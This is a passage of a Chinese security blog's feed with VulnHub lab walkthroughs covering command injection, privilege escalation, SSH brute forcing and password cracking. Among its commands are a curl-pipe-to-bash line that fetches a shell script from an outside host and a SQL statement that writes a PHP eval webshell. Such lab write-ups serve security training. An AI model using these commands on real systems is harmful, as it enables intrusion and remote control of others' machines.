data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=\">http://192.168.31.143:8080/users</span></p>\n<h3 id=\"burp-篡改数据包\"><a class=\"markdownIt-Anchor\" href=\"#burp-篡改数据包\">#</a> BURP 篡改数据包</h3>\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=\">http://192.168.31.143:8080/login</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-586.png\" width=\"520\" alt=\"Image\">\n<p>提示请求方法错了，抓包看下数据包：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-587.png\" width=\"650\" alt=\"Image\">\n<p>提示提交方法有问题，换其他的提交方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-588.png\" width=\"650\" alt=\"Image\">\n<p>提示 username 字段不能为空，那就加上 username 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-589.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 提示内容不理解，换其他目录查看</p>\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-590.png\" width=\"520\" alt=\"Image\">\n<p>提示请求方法错了，抓包看下数据包：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-591.png\" width=\"650\" alt=\"Image\">\n<p>提示提交方法有问题，换其他的提交方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-592.png\" width=\"650\" alt=\"Image\">\n<p>提示 username 字段不能为空，那就加上 username 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-593.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 没啥效果，去访问其他页面看看 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=\">http://192.168.31.143:8080/users</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-594.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 猜测确实需要 username 和 password 两个字段</p>\n<h3 id=\"content-type-字段利用\"><a class=\"markdownIt-Anchor\" href=\"#content-type-字段利用\">#</a> Content-Type 字段利用</h3>\n<p>仔细观察数据包，发现缺少 Content-type 字段：<br>\napplication/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。<br>\nmultipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。<br>\ntext/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。</p>\n<p>访问目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u\">http://192.168.31.143:8080/registration</span><br>\n 添加字段：Content-Type:application/x-www-form-urlencoded</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-595.png\" width=\"650\" alt=\"Image\">\n<p>提示变了，password 字段不能为空，再加上 password 字段：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-596.png\" width=\"650\" alt=\"Image\">\n<p>注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-597.png\" width=\"650\" alt=\"Image\">\n<p>再访问一些别的页面（现在是在登陆状态中）：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-598.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 没啥新发现</p>\n<h3 id=\"扩大信息面\"><a class=\"markdownIt-Anchor\" href=\"#扩大信息面\">#</a> 扩大信息面</h3>\n<p>用更大的字典又扫了一遍目录，发现两个新目录</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl\">http://192.168.31.143:8080/create</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu\">http://192.168.31.143:8080/run</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-599.png\" width=\"380\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu\">http://192.168.31.143:8080/run</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-600.png\" width=\"420\" alt=\"Image\">\n<p>提示需要修改请求方法，抓取数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-601.png\" width=\"650\" alt=\"Image\">\n<p>修改提交方法为 POST</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-602.png\" width=\"650\" alt=\"Image\">\n<p>提示要以 url:port 形式提供要请求的 URL：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-603.png\" width=\"650\" alt=\"Image\">\n<p>格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-604.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 现在又提示需要 secret key ，</p>\n<h3 id=\"伪造-access_token\"><a class=\"markdownIt-Anchor\" href=\"#伪造-access_token\">#</a> 伪造 access_token</h3>\n<p>访问一下 /secret 页面：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-605.png\" width=\"650\" alt=\"Image\">\n<p>登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：<br>\n <code>“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”</code></p>\n<p>但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的<br>\n翻阅网站，找到以下地址中网站中有个链接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-606.png\" width=\"650\" alt=\"Image\">\n<p>点进去看看，有一些配置信息链接，从中找到了 cookie 的名称</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-607.png\" width=\"650\" alt=\"Image\">\n<p>再次提交 cookie，字段名字为 access_token_cookie：</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-608.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 得到 “secret_key”: “commandexecutionissecret”</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重新梳理一下思路：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示<span class=\"built_in\">uname</span>字段缺失，因此增加了该字段，但是无效果</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">2 .访问<span class=\"built_in\">users</span>页面，发现确实需要<span class=\"built_in\">uname</span>和password两个字段</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">3 .重新审查registration数据包，发现缺少Content-Type字段</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了<span class=\"built_in\">uname</span>数据提示缺少password字段，添加后返回注册成功的消息</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">5 .在login中添加Content-Type与<span class=\"built_in\">uname</span>和password后登陆成功，返回了access_token</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">9 .接下来需要访问run界面，并且把上述得到的secret_key加上</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"curl-rce-命令执行\"><a class=\"markdownIt-Anchor\" href=\"#curl-rce-命令执行\">#</a> CURL RCE 命令执行</h3>\n<p>访问 run 界面，加上 secret_key 字段</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-609.png\" width=\"650\" alt=\"Image\">\n<p>返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-610.png\" width=\"650\" alt=\"Image\">\n<p>相当于在 curl 后拼接命令，但是管道符号不起作用</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-611.png\" width=\"650\" alt=\"Image\">\n<p>后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-612.png\" width=\"650\" alt=\"Image\">\n<p>尝试往其中写入 shell: <code>curl http://www.chentuo.asia/shell.sh | bash;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-613.png\" width=\"650\" alt=\"Image\">\n<p>尝试:`curl <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=\">http://www.chentuo.asia/shell.sh</span> | sh;``</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-614.png\" width=\"650\" alt=\"Image\">\n<p>-&gt; 登陆成功，拿到了 patrick 的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-615.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"pkexec-提权\"><a class=\"markdownIt-Anchor\" href=\"#pkexec-提权\">#</a> pkexec 提权</h3>\n<p>服务器存在 s 权限的 pkexec，并且有 gcc 编译器</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-616.png\" width=\"560\" alt=\"Image\">\n<p>-&gt; 通过 pkexec 进行提权，成功拿到了 root 权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-617.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"配置文件泄露\"><a class=\"markdownIt-Anchor\" href=\"#配置文件泄露\">#</a> 配置文件泄露</h3>\n<p>看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权<br>\n调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-618.png\" width=\"520\" alt=\"Image\">\n<p>找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD<br>\nsudo su 使用此密码通过 patrick 来提到 root</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-619.png\" width=\"460\" alt=\"Image\">\n<p>-&gt; 提权成功，拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 21-30"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/132%20JETTY/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/132%20JETTY/",
            "title": "VULNHUB 32 JETTY",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址:<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvamV0dHktMSw2MjEv\">https://www.vulnhub.com/entry/jetty-1,621/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTkyMjI3OC9hcnRpY2xlL2RldGFpbHMvMTEzNzA1Mjgx\">https://blog.csdn.net/weixin_45922278/article/details/113705281</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 JETTY：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-scan -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-829.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.66</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -A -p- 192.168.31.66</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-830.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,80</p>\n<h3 id=\"ftp-弱口令及下载\"><a class=\"markdownIt-Anchor\" href=\"#ftp-弱口令及下载\">#</a> FTP 弱口令及下载</h3>\n<p>先从 ftp 进行下手</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-831.png\" width=\"440\" alt=\"Image\">\n<p>尝试弱口令登陆成功，看到 ftp 服务中存在两个文件，用 lcd 来在 ftp 服务中控制 kali 的目录，下载文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-832.png\" width=\"480\" alt=\"Image\">\n<p>查看下载下来的两个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-833.png\" width=\"700\" alt=\"Image\">\n<p>其中 README.txt 中给了 Henry、Michael 的用户名，解压 sshpass.zip 的时候发现其是有密码认证的</p>\n<h3 id=\"zip加密破解\"><a class=\"markdownIt-Anchor\" href=\"#zip加密破解\">#</a> zip 加密破解</h3>\n<p>破解 zip  <code>fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-834.png\" width=\"520\" alt=\"Image\">\n<p>也可以使用 zip2john 将加密的 zip 转化为可以用 john 破解的</p>\n<p><code>zip2join sshpass.zip &gt; ssh.txt</code> <br>\n <code>john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-835.png\" width=\"680\" alt=\"Image\">\n<p>得到 zip 的密码为 seahorse！进行解压</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-836.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 解压后即得到了 ssh 的密码</p>\n<p>到目前为止我们已经得到了 ssh 的一个疑似账户 Henry 和一个 ssh 密码<br>\n但是我们扫描端口时并没有发现 ssh 协议是开启的，还需要其他的信息收集</p>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjY=\">http://192.168.31.66</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-837.png\" width=\"520\" alt=\"Image\">\n<p>识别目录，看能否找到更多的目录信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-838.png\" width=\"360\" alt=\"Image\">\n<p>查看目录: <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuNjYvcm9ib3RzLnR4dA==\">http://192.168.31.66/robots.txt</span></p>\n<p>发现了四个目录，依次访问之后没有发现</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-839.png\" width=\"440\" alt=\"Image\">\n<p>到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有开启 ssh 协议，是不是之前识别的结果有问题？还有就是 ssh 用户名只有这一个吗，还有没有其他的可能的用户名。带着问题去看 vulnhub 上给出的提示，发现了一个用户名 Squiddie。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-840.png\" width=\"450\" alt=\"Image\">\n<h3 id=\"hydra-爆破-ssh\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破-ssh\">#</a> hydra 爆破 ssh</h3>\n<p>其次，用 nmap 再次更详细的扫描一下端口，看能否扫描到 ssh 协议</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-841.png\" width=\"570\" alt=\"Image\">\n<p>经过这一次的扫描，扫描到了 65507 端口开放的是 ssh 协议可能因为这个端口在比较靠后的位置，并且不是常用的端口，所以第一次扫描的时候并没有扫到</p>\n<p>003 hydra 指定端口爆破，find 提权</p>\n<p>现在我门就通过 hydra 爆破 65507 端口处的 ssh 协议，并且指定用户名为 Henry、Michael、Squiddie 以及这三个及首字母变为小写的三个，密码为爆破 zip 之后解压出来的密码<br>\n <code>hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh</code></p>\n<p>得到密码并连接</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-843.png\" width=\"700\" alt=\"Image\">\n<p>ssh <span class=\"exturl\" data-url=\"bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=\">squiddie@192.168.31.66</span> -p 65507</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-844.png\" width=\"630\" alt=\"Image\">\n<p>-&gt; 连接成功</p>\n<h3 id=\"sudofind-提权\"><a class=\"markdownIt-Anchor\" href=\"#sudofind-提权\">#</a> sudo (find) 提权</h3>\n<p>靶机里边装了一个 python2 的命令，输入 python2 打开其命令行</p>\n<blockquote>\n<p>import pty<br>\npty.spawn(&quot;/bin/bash&quot;)</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-846.png\" width=\"520\" alt=\"Image\">\n<p>得到一个标准的 shell</p>\n<blockquote>\n<p>sudo -l 时发现了可以无密码调用 root 的 find 命令，利用 find 提权<br>\n sudo find. -exec /bin/sh ; -quit</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-847.png\" width=\"450\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n<h3 id=\"架构不支持处理\"><a class=\"markdownIt-Anchor\" href=\"#架构不支持处理\">#</a> 架构不支持处理</h3>\n<p>此靶机的目标是找到犯罪证据，还需进一步的深入测试，查看定时任务  <code>crontab -l</code>  发现有一个备份文件一直在执行，此命令就是做一个备份，跟踪找到这个.docs 的文件夹查看内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-848.png\" width=\"480\" alt=\"Image\">\n<blockquote>\n<p>这里有几个 xlsx 的文件以及一个文件夹，也许这几个文件就是犯罪证据，我们将这些文件都发送到 kali 机器上，用 scp/ftp/python 等方式进行传输<br>\n scp -r * <span class=\"exturl\" data-url=\"bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjY1\">parallels@192.168.31.65</span>:~/Desktop/tool/jetty/doc/</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-849.png\" width=\"580\" alt=\"Image\">\n<p>Kali 机器接受到文件之后，直接双击打开这些 xlsx 的文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-850.png\" width=\"620\" alt=\"Image\">\n<p>错误内容显示架构不支持，因为此 kali 机器是在 mac M1 上虚拟出来的虚拟机，是 arm 架构的 kali，所以有些东西是没有兼容的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-851.png\" width=\"580\" alt=\"Image\">\n<p>并且 Password_kepper 文件夹中有一个 exe 的 windows 上才能执行的可执行文件，是需要发到 windows 机器上才能运行的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-852.png\" width=\"470\" alt=\"Image\">\n<p>这个地方我再次通过 scp 将这些文件都传输到了一般用的 amd 的 windows 机器<br>\n <code>ping 192.168.31.91</code> <br>\n <code>scp -r * administrator@192.168.31.91:/E:/Desktop/doc/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-853.png\" width=\"520\" alt=\"Image\">\n<p>传输成功，结果如下图</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-854.png\" width=\"630\" alt=\"Image\">\n<p>xlsx 文件需要密码才能解开</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-855.png\" width=\"430\" alt=\"Image\">\n<p>运行 exe 文件，发现有个选项可以查看密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-856.png\" width=\"580\" alt=\"Image\">\n<p>大致浏览了一下所有的信息之后，发现这个 exe 文件是用 pyinstaller 编译出来的，既然如此，接下来我们的目标就是去反编译这个 exe 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-857.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"uncompyle6-反编译-pyc\"><a class=\"markdownIt-Anchor\" href=\"#uncompyle6-反编译-pyc\">#</a> uncompyle6 反编译 pyc</h3>\n<p>下载在 github 上用于反编译 pyinstaller 生成的文件的工具 pyinstxtractor<br>\n <code>wget https://github.com/extremecoders-re/pyinstxtractor.git</code> <br>\n <code>Python2 pyinstxtractor.py password_keeper.exe</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-858.png\" width=\"700\" alt=\"Image\">\n<p>查看执行效果</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-859.png\" width=\"620\" alt=\"Image\">\n<p>执行之后会在 pyinstxtractor.py 同目录下生成一个文件夹，产生一个 password_keeper.exe_extracted 目录，在目录下找到关键 pyc 文件也就是 password_keeper.pyc，再将这个文件反编译。</p>\n<blockquote>\n<p>使用 uncompyle6 反编译 pyc 文件<br>\n安装 uncompyle  <code>pip install uncompyle</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-860.png\" width=\"700\" alt=\"Image\">\n<p>反编译 pyc 文件  <code>uncompyle6 .\\password_keeper.pyc &gt; password_keeper.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-861.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"调查取证\"><a class=\"markdownIt-Anchor\" href=\"#调查取证\">#</a> 调查取证</h3>\n<p>对得到的代码进行代码审计</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-862.png\" width=\"660\" alt=\"Image\">\n<p>总结功能大概如下，我们输入选项之后，需要我们输入一个密钥，将此密钥进行 base64 加密后与代码中的 key 进行比对，如果是相同的就会输出密码</p>\n<p>先进行 base64 解密 <code>echo “N2FlMjE4ZmYyOTI4ZjZiMg==” ｜ base64 -d</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-863.png\" width=\"580\" alt=\"Image\">\n<p>运行 exe 文件，输入 1，然后输入解密后的密钥 7ae218ff2928f6b2</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-864.png\" width=\"400\" alt=\"Image\">\n<p>得到了五个密码，分别是这五个 xlsx 的密码<br>\n<img data-src=\"/N1h1l157/VULNHUB/image-865.png\" width=\"520\" alt=\"Image\"></p>\n<p>-&gt; 成功拿到犯罪证据</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/",
            "title": "VULNHUB 29 PRESIDENTIAL",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcHJlc2lkZW50aWFsLTEsNTAwLw==\">https://www.vulnhub.com/entry/presidential-1,500/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 PRESIDENTIAL：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址<br>\n <code>sudo arp-sacn -l</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-723.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.0.153</p>\n<p>2 ）确认靶机 ip 开放的端口信息<br>\n <code>sudo nmap -p 192.168.0.153</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-724.png\" width=\"440\" alt=\"Image\">\n<p>-&gt; 靶机开放端口 21,2082</p>\n<p>发现了一个比较奇怪的端口，用 nmap 扫描其详细信息，发现是 ssh 服务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-725.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTM=\">http://192.168.0.153</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-726.png\" width=\"520\" alt=\"Image\">\n<p>没有明显发现，对其目录结构进行扫描</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-727.png\" width=\"440\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocA==\">http://192.168.0.153/config.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-728.png\" width=\"320\" alt=\"Image\">\n<p>查看目录:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNTMvY29uZmlnLnBocC5iYWs=\">http://192.168.0.153/config.php.bak</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-729.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 发现了数据库的账户名密码 votebox:casoj3FFASPsbyoRP</p>\n<p>但是没有数据库的端口开通，发现没法利用，查看 80 端口的网站，看能否找到更多敏感的信息，发现了一个域名，我们就用这个域名做 DNS 解析指向其 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-730.png\" width=\"520\" alt=\"Image\">\n<p>修改本地 hosts 文件，指定规则如下</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-731.png\" width=\"320\" alt=\"Image\">\n<p>访问 <span class=\"exturl\" data-url=\"aHR0cDovL3ZvdGVub3cubG9jYWw=\">http://votenow.local</span> 成功显示出来该网站</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-732.png\" width=\"520\" alt=\"Image\">\n<p>做一波目录扫描，发现和原 ip 的扫描内容一模一样</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-733.png\" width=\"440\" alt=\"Image\">\n<h3 id=\"wfuzz-扫描子域名\"><a class=\"markdownIt-Anchor\" href=\"#wfuzz-扫描子域名\">#</a> wfuzz 扫描子域名</h3>\n<p>既然是域名，何不进行一波子域名的收集，用 subDomainsBrute 爆破子域名</p>\n<p><code>python subDomainsBrute.py votenow.local</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-734.png\" width=\"580\" alt=\"Image\">\n<p>但是没有扫描到任何目录，需要注意的是我们去识别此域名的子域名，其解析的 ip 地址依然要指向靶机的 IP 地址</p>\n<p>用 wfuzz 来枚举子域名<br>\n <code>wfuzz -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H &quot;Host: FUZZ.votenow.local&quot; --hw 854 --hc 400 votenow.local</code></p>\n<p>通过这种方法收集的子域名的解析地址都是目标靶机的 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-735.png\" width=\"700\" alt=\"Image\">\n<p>将扫描到的子域名加入到本地 hosts 文件中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-736.png\" width=\"390\" alt=\"Image\">\n<p>访问网站 <span class=\"exturl\" data-url=\"aHR0cDovL2RhdGFzYWZlLnZvdGVub3cubG9jYWw=\">http://datasafe.votenow.local</span> , 输入之前泄漏的数据库账户密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-737.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 拿到 phpmyadmin 的权限</p>\n<h3 id=\"phpmyadmin后台写shell\"><a class=\"markdownIt-Anchor\" href=\"#phpmyadmin后台写shell\">#</a> phpmyadmin 后台写 shell</h3>\n<p>点击 SQL，尝试执行敏感的 sql 语句，写入 webshell</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-738.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示目录</span></span><br><span class=\"line\">show variables like &#x27;%datadir%&#x27;;</span><br><span class=\"line\">select @@basedir;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-739.png\" width=\"380\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">数据库当前操作用户拥有写权限：</span></span><br><span class=\"line\">show global variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-740.png\" width=\"380\" alt=\"Image\">\n<ul>\n<li>secure_file_priv 参数：<br>\n<strong>NULL 不允许导入或导出；/tmp 只允许在 /tmp 目录导入导出；空 不限制目录</strong></li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">写入一句话后门：</span></span><br><span class=\"line\">select &#x27;&lt;?php @eval($_POST[&#x27;x&#x27;]);?&gt;&#x27; INTO 